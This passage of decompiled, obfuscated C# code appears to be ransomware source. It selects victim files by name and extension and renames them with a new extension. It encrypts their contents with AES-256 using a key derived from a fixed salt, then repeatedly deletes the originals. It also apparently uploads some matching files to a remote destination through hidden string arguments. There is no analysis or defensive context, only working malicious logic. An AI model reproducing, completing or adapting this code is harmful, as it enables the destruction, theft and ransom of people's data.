			if (((!CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(bKLeOnnwOsJw.getString_0(107389372)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(bKLeOnnwOsJw.getString_0(107389347)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(bKLeOnnwOsJw.getString_0(107388802)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(bKLeOnnwOsJw.getString_0(107388753)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(bKLeOnnwOsJw.getString_0(107388772)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(bKLeOnnwOsJw.getString_0(107388715)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(bKLeOnnwOsJw.getString_0(107388694)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(bKLeOnnwOsJw.getString_0(107388713)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(bKLeOnnwOsJw.getString_0(107388700)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(bKLeOnnwOsJw.getString_0(107388631)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(bKLeOnnwOsJw.getString_0(107388622)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(bKLeOnnwOsJw.getString_0(107388637)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(bKLeOnnwOsJw.getString_0(107388611)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(bKLeOnnwOsJw.getString_0(107388558))) || CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(FEZRNsQdHf(bKLeOnnwOsJw.getString_0(107389045)))) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(bKLeOnnwOsJw.getString_0(107389004)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(bKLeOnnwOsJw.getString_0(107389019)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(bKLeOnnwOsJw.getString_0(107389002)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(bKLeOnnwOsJw.getString_0(107388953)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(bKLeOnnwOsJw.getString_0(107388968)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(bKLeOnnwOsJw.getString_0(107388919)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(bKLeOnnwOsJw.getString_0(107388934)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(bKLeOnnwOsJw.getString_0(107388885)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(bKLeOnnwOsJw.getString_0(107388904)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(bKLeOnnwOsJw.getString_0(107388851)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(bKLeOnnwOsJw.getString_0(107388870)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(bKLeOnnwOsJw.getString_0(107388825)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(bKLeOnnwOsJw.getString_0(107388840)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(bKLeOnnwOsJw.getString_0(107388279)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(FEZRNsQdHf(bKLeOnnwOsJw.getString_0(107388294))) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(bKLeOnnwOsJw.getString_0(107388237)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(bKLeOnnwOsJw.getString_0(107396364)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(bKLeOnnwOsJw.getString_0(107388256)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.EndsWith(CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.EndsWith(bKLeOnnwOsJw.getString_0(107388231)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.EndsWith(bKLeOnnwOsJw.getString_0(107388226)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.EndsWith(bKLeOnnwOsJw.getString_0(107388221)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.EndsWith(bKLeOnnwOsJw.getString_0(107388184)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(bKLeOnnwOsJw.getString_0(107388179)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(RoiBxbbYOpTnzdF) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(dtHHyJMWMTcTg) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(muQSQoYNOwJp))
			{
				if (CS_0024_003C_003E8__locals0.nBTsxqqCcIrA.Length != 0)
				{
					string[] nBTsxqqCcIrA = CS_0024_003C_003E8__locals0.nBTsxqqCcIrA;
					int num = 0;
					while (num < nBTsxqqCcIrA.Length)
					{
						string value = nBTsxqqCcIrA[num];
						if (!CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_100c;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.EndsWith(CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ))
					{
						goto IL_100c;
					}
				}
				catch (Exception)
				{
					goto IL_100c;
				}
				if (!SNtBTLidlROtoV.Contains(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA))
				{
					if (BBqvZtJMKtZyzF == bKLeOnnwOsJw.getString_0(107396829))
					{
						try
						{
							if (SXyxscfevxEF.IyHWOJymzstKa(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA))
							{
								SXyxscfevxEF.bVUJKLBlSikLI(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
							}
						}
						catch
						{
						}
					}
					SNtBTLidlROtoV.Add(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
					if (!HMEbcaxMfcYzgl.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA)))
					{
						HMEbcaxMfcYzgl.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA));
					}
					btQRMXqHMyAV(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
					try
					{
						new slbXyVBmkFjuC().RBNXdzZVQAFiAJMA(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
					}
					catch
					{
					}
					try
					{
						using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, FileMode.Open, FileAccess.Write);
						if (!fileStream.CanWrite)
						{
							try
							{
								if (fgLeGcGjPkpRXH)
								{
									Console.WriteLine(bKLeOnnwOsJw.getString_0(107401946) + CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + bKLeOnnwOsJw.getString_0(107401901) + new FileInfo(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA).Length + bKLeOnnwOsJw.getString_0(107401880));
									Console.WriteLine(bKLeOnnwOsJw.getString_0(107401871));
								}
							}
							catch
							{
							}
							cMEEnMgkUxxsbbNh(FEZRNsQdHf(bKLeOnnwOsJw.getString_0(107402310)), bKLeOnnwOsJw.getString_0(107388127) + CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + bKLeOnnwOsJw.getString_0(107388127) + FEZRNsQdHf(bKLeOnnwOsJw.getString_0(107402253)) + bKLeOnnwOsJw.getString_0(107388127) + Environment.UserName + bKLeOnnwOsJw.getString_0(107388127) + FEZRNsQdHf(bKLeOnnwOsJw.getString_0(107402268)));
						}
					}
					catch (Exception ex2)
					{
						if (CCDyMIHlAe)
						{
							try
							{
								File.AppendAllText(dtHHyJMWMTcTg, bKLeOnnwOsJw.getString_0(107386376) + CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + bKLeOnnwOsJw.getString_0(107402243) + ex2.Message + bKLeOnnwOsJw.getString_0(107395766));
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
						return;
					}
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA).Length != 0L)
							{
								goto end_IL_0856;
							}
							goto end_IL_0855;
							end_IL_0856:;
						}
						catch (Exception ex2)
						{
							if (CCDyMIHlAe)
							{
								try
								{
									File.AppendAllText(dtHHyJMWMTcTg, bKLeOnnwOsJw.getString_0(107386376) + CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + bKLeOnnwOsJw.getString_0(107402130) + ex2.Message + bKLeOnnwOsJw.getString_0(107395766));
								}
								catch (Exception)
								{
								}
							}
							LVKhJcfUHGhpJNXz++;
							goto end_IL_0855;
						}
						if (QOKbVStgyeVL == bKLeOnnwOsJw.getString_0(107396829) && new FileInfo(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA).Length > Convert.ToInt32(UawyhGBHBLgS) * 1024 * 1024)
						{
							try
							{
								if (CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ != bKLeOnnwOsJw.getString_0(107385585))
								{
									if (YazilaoopZ)
									{
										CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ = tltXBlUAjNeRsFxCp + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ;
									}
									File.Move(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ);
								}
							}
							catch (Exception ex2)
							{
								if (CCDyMIHlAe)
								{
									try
									{
										File.AppendAllText(dtHHyJMWMTcTg, bKLeOnnwOsJw.getString_0(107386376) + CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + bKLeOnnwOsJw.getString_0(107401557) + ex2.Message + bKLeOnnwOsJw.getString_0(107395766));
									}
									catch (Exception)
									{
									}
								}
								LVKhJcfUHGhpJNXz++;
								return;
							}
							if (CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ != bKLeOnnwOsJw.getString_0(107385585))
							{
								CS_0024_003C_003E8__locals0.ldrdWbhdALtRA += CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ;
							}
							if (DXDIUZMazYGZy == bKLeOnnwOsJw.getString_0(107396829))
							{
								Thread thread = new Thread((ThreadStart)delegate
								{
									foreach (string item3 in YoPwmbBPpdD)
									{
										if (CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.SnSgbcozGOnPa.MaDQWNsFQFSMFZ) && HFFrRFIpQgjXI == bKLeOnnwOsJw.SmDDBVlBSoLlZfP.getString_0(107396835))
										{
											if (Convert.ToInt32(PZYHNDUWTf) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA).Length)
											{
												try
												{
													ATYckHdWsYOYHnae.GBhprVwnyvota(bKLeOnnwOsJw.SmDDBVlBSoLlZfP.getString_0(107389883), bKLeOnnwOsJw.SmDDBVlBSoLlZfP.getString_0(107389878), bKLeOnnwOsJw.SmDDBVlBSoLlZfP.getString_0(107389897), CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().EndsWith(item3) && HFFrRFIpQgjXI == bKLeOnnwOsJw.SmDDBVlBSoLlZfP.getString_0(107396262))
										{
											try
											{
												ATYckHdWsYOYHnae.GBhprVwnyvota(bKLeOnnwOsJw.SmDDBVlBSoLlZfP.getString_0(107389883), bKLeOnnwOsJw.SmDDBVlBSoLlZfP.getString_0(107389878), bKLeOnnwOsJw.SmDDBVlBSoLlZfP.getString_0(107389897), CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
											}
											catch
											{
											}
										}
									}
								});
								thread.IsBackground = false;
								thread.Priority = ThreadPriority.Normal;
								thread.Start();
							}
							byte[] bytes = Encoding.ASCII.GetBytes(EXVykcHaTCNay);
							if (nqNdPWHffReq == bKLeOnnwOsJw.getString_0(107396256))
							{
								byte[] array = null;
								byte[] byte_ = DwwAAJBOSmbJ.fENIZKTbvW(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, Convert.ToInt32(UawyhGBHBLgS) * 1024 * 1024);
								if (!DwwAAJBOSmbJ.IjvngclRYVi(PLFvJzqFVyEE: (!uBIPmjbCjNt) ? (PAOJgADrbjEa ? DwwAAJBOSmbJ.ZUYcQJLxxSxnH(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.MXXPCoXZKEzPC), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : DwwAAJBOSmbJ.ZUYcQJLxxSxnH(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.MXXPCoXZKEzPC), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (PAOJgADrbjEa ? lIsgGRoCjKMwrhD.QpIcrEUyluw(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.MXXPCoXZKEzPC), Convert.FromBase64String(sTQyJSLcZOIiC)) : lIsgGRoCjKMwrhD.QpIcrEUyluw(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.MXXPCoXZKEzPC), Convert.FromBase64String(sTQyJSLcZOIiC))), rfRQjrzTSbahvMj: CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, CYHcaFOGLSEpY: bytes))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!PAOJgADrbjEa)
							{
								if (!WZQPKbNkyop.RrUwydtFfvDr(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, UawyhGBHBLgS, CS_0024_003C_003E8__locals0.MXXPCoXZKEzPC, null, Convert.FromBase64String(sTQyJSLcZOIiC)))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!WZQPKbNkyop.RrUwydtFfvDr(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, UawyhGBHBLgS, CS_0024_003C_003E8__locals0.MXXPCoXZKEzPC, bytes, Convert.FromBase64String(sTQyJSLcZOIiC)))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else
						{
							if (YazilaoopZ)
							{
								CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ = tltXBlUAjNeRsFxCp + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ;
							}
							byte[] bytes = Encoding.ASCII.GetBytes(EXVykcHaTCNay);
							if (CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ != bKLeOnnwOsJw.getString_0(107385585))
							{
								if (!UOlZmEwYRBbnfmvt)
								{
									if (!PAOJgADrbjEa)
									{
										uEiSXmUOmqEhAY(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ, bGfpmpYMCsNkyjcK);
									}
									else
									{
										uEiSXmUOmqEhAY(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ, Convert.FromBase64String(CS_0024_003C_003E8__locals0.MXXPCoXZKEzPC));
									}
								}
								else
								{
									try
									{
										if (!PAOJgADrbjEa)
										{
											toHVfEOmOJ(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ, bGfpmpYMCsNkyjcK, Convert.FromBase64String(sTQyJSLcZOIiC));
										}
										else
										{
											toHVfEOmOJ(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ, Convert.FromBase64String(CS_0024_003C_003E8__locals0.MXXPCoXZKEzPC), Convert.FromBase64String(sTQyJSLcZOIiC));
										}
									}
									catch (Exception ex2)
									{
										if (CCDyMIHlAe)
										{
											try
											{
												File.AppendAllText(dtHHyJMWMTcTg, bKLeOnnwOsJw.getString_0(107386376) + CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + bKLeOnnwOsJw.getString_0(107385603) + ex2.Message + bKLeOnnwOsJw.getString_0(107395766));
											}
											catch (Exception)
											{
											}
										}
										LVKhJcfUHGhpJNXz++;
										try
										{
											File.Move(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
											return;
										}
										catch (Exception)
										{
											return;
										}
									}
								}
							}
							else if (!UOlZmEwYRBbnfmvt)
							{
								if (!PAOJgADrbjEa)
								{
									uEiSXmUOmqEhAY(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + bKLeOnnwOsJw.getString_0(107385580), bGfpmpYMCsNkyjcK);
								}
								else
								{
									uEiSXmUOmqEhAY(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + bKLeOnnwOsJw.getString_0(107385580), Convert.FromBase64String(CS_0024_003C_003E8__locals0.MXXPCoXZKEzPC));
								}
							}
							else
							{
								try
								{
									if (!PAOJgADrbjEa)
									{
										toHVfEOmOJ(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, bGfpmpYMCsNkyjcK, Convert.FromBase64String(sTQyJSLcZOIiC));
									}
									else
									{
										toHVfEOmOJ(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, Convert.FromBase64String(CS_0024_003C_003E8__locals0.MXXPCoXZKEzPC), Convert.FromBase64String(sTQyJSLcZOIiC));
									}
								}
								catch (Exception ex2)
								{
									if (CCDyMIHlAe)
									{
										try
										{
											File.AppendAllText(dtHHyJMWMTcTg, bKLeOnnwOsJw.getString_0(107386376) + CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + bKLeOnnwOsJw.getString_0(107385603) + ex2.Message + bKLeOnnwOsJw.getString_0(107395766));
										}
										catch (Exception)
										{
										}
									}
									LVKhJcfUHGhpJNXz++;
									return;
								}
							}
							if (PAOJgADrbjEa)
							{
								if (CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ != bKLeOnnwOsJw.getString_0(107385585))
								{
									QXCLEGXnLYcbL(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ, bytes);
								}
								else
								{
									QXCLEGXnLYcbL(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, bytes);
								}
							}
						}
						end_IL_0855:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_100c;
			IL_100c:
			CS_0024_003C_003E8__locals0.vJUzSMoRbycwzG.Remove(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
		});
	}

	private static void yioNeaXTom(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (DXDIUZMazYGZy == getString_0(107396809))
					{
						foreach (string item in YoPwmbBPpdD)
						{
							if (string_0.ToLower().EndsWith(item) && HFFrRFIpQgjXI == getString_0(107396809))
							{
								if (Convert.ToInt32(PZYHNDUWTf) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										ATYckHdWsYOYHnae.GBhprVwnyvota(getString_0(107389857), getString_0(107389852), getString_0(107389871), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && HFFrRFIpQgjXI == getString_0(107396236))
							{
								try
								{
									ATYckHdWsYOYHnae.GBhprVwnyvota(getString_0(107389857), getString_0(107389852), getString_0(107389871), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107385560)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107385560), getString_0(107389296)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void toHVfEOmOJ(string PUmRLWSejrVzRu, string qrwtmiUaKhXXsM, byte[] xuHIFBjKvgcWPOj, byte[] clhVRRfnEKRtOha = null)
	{
		try
		{
			if (DXDIUZMazYGZy == getString_0(107396809))
			{
				FileStream fileStream = new FileStream(PUmRLWSejrVzRu, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				foreach (string item in YoPwmbBPpdD)
				{
					if (PUmRLWSejrVzRu.ToLower().EndsWith(item) && HFFrRFIpQgjXI == getString_0(107396809))
					{
						if (Convert.ToInt32(PZYHNDUWTf) * 1024 * 1024 > fileStream.Length)
						{
							try
							{
								ATYckHdWsYOYHnae.GBhprVwnyvota(getString_0(107389857), getString_0(107389852), getString_0(107389871), PUmRLWSejrVzRu);
							}
							catch
							{
							}
						}
					}
					else if (PUmRLWSejrVzRu.ToLower().EndsWith(item) && HFFrRFIpQgjXI == getString_0(107396236))
					{
						try
						{
							ATYckHdWsYOYHnae.GBhprVwnyvota(getString_0(107389857), getString_0(107389852), getString_0(107389871), PUmRLWSejrVzRu);
						}
						catch
						{
						}
					}
				}
				fileStream.Dispose();
			}
		}
		catch
		{
		}
		if (PUmRLWSejrVzRu != qrwtmiUaKhXXsM)
		{
			File.Move(PUmRLWSejrVzRu, qrwtmiUaKhXXsM);
			PUmRLWSejrVzRu = qrwtmiUaKhXXsM;
		}
		byte[] bytes = lIsgGRoCjKMwrhD.QpIcrEUyluw(File.ReadAllBytes(PUmRLWSejrVzRu), xuHIFBjKvgcWPOj, clhVRRfnEKRtOha);
		File.WriteAllBytes(PUmRLWSejrVzRu, bytes);
		qXIAEocyZgLqByS++;
	}

	private static void uEiSXmUOmqEhAY(string string_0, string string_1, byte[] byte_0)
	{
		cTttKVwFNmpq CS_0024_003C_003E8__locals0 = new cTttKVwFNmpq();
		CS_0024_003C_003E8__locals0.cQQeCUDDoZYTm = string_0;
		CS_0024_003C_003E8__locals0.eedfnXcwSQkQNFbIx = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string eedfnXcwSQkQNFbIx = CS_0024_003C_003E8__locals0.eedfnXcwSQkQNFbIx;
			FileStream fileStream = new FileStream(eedfnXcwSQkQNFbIx, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (QtTrkEhpkGUJgMO == getString_0(107396809))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.cQQeCUDDoZYTm, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.cQQeCUDDoZYTm, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.cQQeCUDDoZYTm, FileMode.Open);
				int num2;
				while ((num2 = fileStream2.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num2);
				}
				fileStream2.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.eedfnXcwSQkQNFbIx.Length > 0)
				{
					if (DXDIUZMazYGZy == getString_0(107396809))
					{
						FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.cQQeCUDDoZYTm, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in YoPwmbBPpdD)
						{
							if (CS_0024_003C_003E8__locals0.cQQeCUDDoZYTm.ToLower().EndsWith(item) && HFFrRFIpQgjXI == getString_0(107396809))
							{
								if (Convert.ToInt32(PZYHNDUWTf) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										ATYckHdWsYOYHnae.GBhprVwnyvota(getString_0(107389857), getString_0(107389852), getString_0(107389871), CS_0024_003C_003E8__locals0.cQQeCUDDoZYTm);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.cQQeCUDDoZYTm.ToLower().EndsWith(item) && HFFrRFIpQgjXI == getString_0(107396236))
							{
								try
								{
									ATYckHdWsYOYHnae.GBhprVwnyvota(getString_0(107389857), getString_0(107389852), getString_0(107389871), CS_0024_003C_003E8__locals0.cQQeCUDDoZYTm);
								}
								catch
								{
								}
							}
						}
						fileStream3.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.cQQeCUDDoZYTm);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.eedfnXcwSQkQNFbIx.EndsWith(getString_0(107385560)))
					{
						File.Move(CS_0024_003C_003E8__locals0.eedfnXcwSQkQNFbIx, CS_0024_003C_003E8__locals0.eedfnXcwSQkQNFbIx.Replace(getString_0(107385560), getString_0(107389296)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.eedfnXcwSQkQNFbIx))
							{
								File.Delete(CS_0024_003C_003E8__locals0.eedfnXcwSQkQNFbIx);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (CCDyMIHlAe)
			{
				try
				{
					File.AppendAllText(dtHHyJMWMTcTg, getString_0(107386356) + CS_0024_003C_003E8__locals0.cQQeCUDDoZYTm + getString_0(107385583) + ex2.Message + getString_0(107395746));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__6()
	{
		List<string> vfIRuRDoHW = VfIRuRDoHW;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
			{
				cMEEnMgkUxxsbbNh(FEZRNsQdHf(getString_0(107385498)), string_0);
			};
		}
